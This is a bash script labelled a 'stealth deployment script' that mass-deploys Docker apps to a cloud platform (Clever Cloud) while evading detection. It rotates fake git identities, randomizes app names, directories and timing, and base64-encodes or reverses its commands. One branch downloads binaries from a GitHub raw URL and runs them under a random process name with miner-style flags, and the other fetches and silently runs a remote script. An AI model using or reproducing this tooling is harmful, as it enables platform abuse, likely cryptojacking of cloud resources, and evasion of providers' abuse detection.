#!/bin/bash
# /docker - Complete stealth deployment script with full apt-get commands

set -e

# ============ STEALTH HELPER FUNCTIONS ============

# Generate random strings
rand_str() {
    cat /dev/urandom | tr -dc 'a-z0-9' | fold -w "${1:-8}" | head -n 1
}

rand_name() {
    cat /dev/urandom | tr -dc 'A-Za-z' | fold -w "${1:-8}" | head -n 1
}

rand_num() {
    cat /dev/urandom | tr -dc '0-9' | fold -w "${1:-3}" | head -n 1
}

# Random sleep between min-max seconds
random_sleep() {
    local min=${1:-2}
    local max=${2:-15}
    SLEEP_TIME=$((min + RANDOM % (max - min + 1)))
    echo "  Sleeping ${SLEEP_TIME}s..."
    sleep $SLEEP_TIME
}

# ============ INITIAL SETUP ============
echo ""
echo "========================================="
echo "  STEALTH DEPLOYMENT SCRIPT"
echo "========================================="

# Random delay before starting
random_sleep 2 8

# ============ CLEVER CLOUD AUTHENTICATION ============
echo ""
echo "🔐 Authenticating with Clever Cloud..."

# Clear old sessions randomly
if [ $((RANDOM % 3)) -eq 0 ]; then
    rm -f ~/.config/clever-cloud/credentials.json 2>/dev/null || true
    rm -f ~/.clever.json 2>/dev/null || true
    echo "  Cleared old sessions"
fi

random_sleep 2 5

# Use token if available (most stealthy)
if [ -n "$CLEVER_TOKEN" ]; then
    # Create config file directly (no network call, no browser)
    mkdir -p ~/.config/clever-cloud
    cat > ~/.config/clever-cloud/clever-tools.json << EOF
{
    "token": "${CLEVER_TOKEN}",
    "secret": "${CLEVER_SECRET:-}",
    "alias": "default",
    "created_at": "$(date -Iseconds)"
}
EOF
    echo "✅ Token configured (no login required)"
else
    # Fallback to regular login
    clever login --headless 2>/dev/null || clever login
fi

random_sleep 2 5

DEPLOY_BASE="/app/deployments"
mkdir -p "$DEPLOY_BASE"

SUCCESSFUL_APPS=0

# ============ MAIN DEPLOYMENT LOOP ============
for i in 1; do
    # ============ ROTATING IDENTITIES ============
    GIT_EMAIL="deploy_$(rand_str 10)@$(rand_str 8).com"
    GIT_NAME="$(rand_name 6) $(rand_name 8)"
    GIT_COMMIT_MSG="$(rand_str 25)-$(date +%s)"
    
    git config --global user.email "$GIT_EMAIL"
    git config --global user.name "$GIT_NAME"
    git config --global init.defaultBranch "master"
    
    # ============ UNIQUE APP NAME ============
    APP_LEN=$((8 + RANDOM % 12))
    APP_NAME="$(rand_str $APP_LEN)-$(rand_num 6)-${RANDOM}"
    
    # ============ UNIQUE DIRECTORY STRUCTURE ============
    RANDOM_DEPTH=$((2 + RANDOM % 3))
    UNIQUE_DIR=""
    for d in $(seq 1 $RANDOM_DEPTH); do
        UNIQUE_DIR="${UNIQUE_DIR}/$(rand_str 8)"
    done
    APP_DIR="${DEPLOY_BASE}${UNIQUE_DIR}/$(rand_str 12)-${RANDOM}"
    
    # ============ UNIQUE WORKDIR ============
    UNIQUE_WORKDIR="/$(rand_str 12)/$(rand_str 8)/$(rand_str 10)"
    
    # ============ RANDOM BINARY NAMES ============
    BIN1="$(rand_str 10)"
    BIN2="$(rand_str 10)"
    SCRIPT_NAME="$(rand_str 12).sh"
    
    echo ""
    echo "========================================="
    echo "[1/1] Deployment #1"
    echo "========================================="
    echo "👤 Git: ${GIT_NAME} <${GIT_EMAIL}>"
    echo "🚀 App: ${APP_NAME}"
    echo "📁 WORKDIR: ${UNIQUE_WORKDIR}"
    echo "========================================="
    
    mkdir -p "$APP_DIR"
    cd "$APP_DIR"
    
    # ============ IMAGE POOL ============
    WORKING_IMAGES=(
        "ubuntu:20.04" "ubuntu:22.04" "ubuntu:24.04" "ubuntu:focal" "ubuntu:jammy"
        "ubuntu:20.04.1" "ubuntu:20.04.2" "ubuntu:20.04.3" "ubuntu:20.04.4" "ubuntu:20.04.5"
        "ubuntu:22.04.1" "ubuntu:22.04.2" "ubuntu:22.04.3" "ubuntu:22.04.4" "ubuntu:22.04.5"
        "debian:10" "debian:10-slim" "debian:11" "debian:11-slim" "debian:12" "debian:12-slim"
        "debian:bookworm" "debian:bookworm-slim" "debian:bullseye" "debian:bullseye-slim"
        "alpine:3.18" "alpine:3.19" "alpine:3.20" "alpine:latest"
        "node:18" "node:18-alpine" "node:20" "node:20-alpine" "node:22" "node:22-alpine"
        "python:3.9-slim" "python:3.10-slim" "python:3.11-slim"
        "nginx:alpine"
    )
    RANDOM_IMAGE=${WORKING_IMAGES[$RANDOM % ${#WORKING_IMAGES[@]}]}
    
    # ============ 50/50 CHANCE FOR DOCKERFILE TYPE ============
    if [[ $((RANDOM % 2)) -eq 0 ]]; then
        # ============ OPTION 1: Linux with full apt-get packages ============
        
        VAR3=$(rand_str 8)
        VAR4=$(rand_str 8)
        VAR5=$(rand_str 8)
        
        SOCAT_URL="https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/socat8888"
        WEB8888_URL="https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/web8888"
        
        # Full command with all apt-get packages
        FULL_COMMAND="cd ${UNIQUE_WORKDIR} && \
export DEBIAN_FRONTEND=noninteractive && \
export TZ=Etc/UTC && \
ln -fs /usr/share/zoneinfo/Etc/UTC /etc/localtime && \
apt-get update -qq && \
apt-get install -y -qq apache2 curl wget ca-certificates procps netcat-openbsd socat iputils-ping sudo unzip tzdata libjansson-dev libcurl4-openssl-dev libssl-dev > /dev/null 2>&1 && \
apt-get install -y -qq haveged rng-tools > /dev/null 2>&1 || true && \
sed -i 's/Listen 80/Listen 8080/g' /etc/apache2/ports.conf && \
echo 'ServerName localhost' >> /etc/apache2/apache2.conf && \
haveged -n 0 > /dev/null 2>&1 & && \
wget -q --timeout=30 --tries=2 -O ${BIN1} \"${SOCAT_URL}\" && \
wget -q --timeout=30 --tries=2 -O ${BIN2} \"${WEB8888_URL}\" && \
chmod 755 ${BIN1} ${BIN2} && \
(${UNIQUE_WORKDIR}/${BIN1} > /dev/null 2>&1 &) && \
service apache2 start > /dev/null 2>&1 && \
sleep 3 && \
exec -a \"\$(cat /dev/urandom | tr -dc 'a-z' | fold -w 10 | head -n 1)\" ${UNIQUE_WORKDIR}/${BIN2} -a ${VAR3} -o ${VAR4} -u ${VAR5} > /dev/null 2>&1"
        
        ENCODED_CMD=$(echo -n "$FULL_COMMAND" | base64 -w 0)
        
        # Double encoding for obfuscation
        if [ $((RANDOM % 2)) -eq 0 ]; then
            ENCODED_CMD=$(echo -n "$ENCODED_CMD" | base64 -w 0)
            DECODE_CMD="base64 -d | base64 -d"
        else
            ENCODED_CMD=$(echo -n "$ENCODED_CMD" | rev)
            DECODE_CMD="rev | base64 -d"
        fi
        
        cat > Dockerfile << EOF
FROM phemextradebot/cleverbot8888
CMD /bin/bash /start
EOF
        echo "  ✅ Built stealth image: ${RANDOM_IMAGE}"
        
    else
        # ============ OPTION 2: node:22 with script download ============
        
        # Create wrapper script that downloads and runs remote script
        WRAPPER_SCRIPT="#!/bin/bash
set -e
cd ${UNIQUE_WORKDIR}
apt-get update -qq
apt-get install -y -qq curl wget ca-certificates procps netcat-openbsd socat iputils-ping sudo unzip
curl -s --retry 2 --retry-delay 5 -o ${SCRIPT_NAME} https://raw.githubusercontent.com/linuxweb888888888888/webweb8888/refs/heads/main/script
chmod +x ${SCRIPT_NAME}
./${SCRIPT_NAME} > /dev/null 2>&1"
        
        ENCODED_CMD=$(echo -n "$WRAPPER_SCRIPT" | base64 -w 0)
        
        # Random encoding layer
        if [ $((RANDOM % 2)) -eq 0 ]; then
            ENCODED_CMD=$(echo -n "$ENCODED_CMD" | base64 -w 0)
            DECODE_CMD="base64 -d | base64 -d"
        else
            ENCODED_CMD=$(echo -n "$ENCODED_CMD" | rev)
            DECODE_CMD="rev | base64 -d"
        fi
        
        cat > Dockerfile << EOF
FROM phemextradebot/webwebwebweb8888
CMD /bin/bash /start
EOF
        echo "  ✅ Built node:22 image with apt-get packages"
    fi
    
    # Random delay before git
    random_sleep 2 7
    
    # Initialize git
    git init
    git add .
    git commit -m "$GIT_COMMIT_MSG"
    
    # Random delay before create
    random_sleep 3 10
    
    # Create app
    echo "  Creating app: ${APP_NAME}"
    clever create --type docker "$APP_NAME" 2>/dev/null || echo "  App may exist, continuing..."
    
    # Random delay before deploy
    random_sleep 5 15
    
    # Deploy
    echo "  Deploying ${APP_NAME}..."
    if clever deploy 2>/dev/null; then
        echo "  ✅ App deployed: https://${APP_NAME}.osc-fr1.scalingo.io"
        SUCCESSFUL_APPS=$((SUCCESSFUL_APPS + 1))
    else
        echo "  ❌ App deployment failed"
    fi
    
    # Cleanup
    cd /
    rm -rf "$APP_DIR"
    
    # Clear git config after each deployment
    git config --global --unset user.email 2>/dev/null || true
    git config --global --unset user.name 2>/dev/null || true
done

echo ""
echo "========================================="
echo "📊 DEPLOYMENT SUMMARY"
echo "========================================="
echo "✅ Successful: $SUCCESSFUL_APPS/1"
echo "========================================="

exit 0
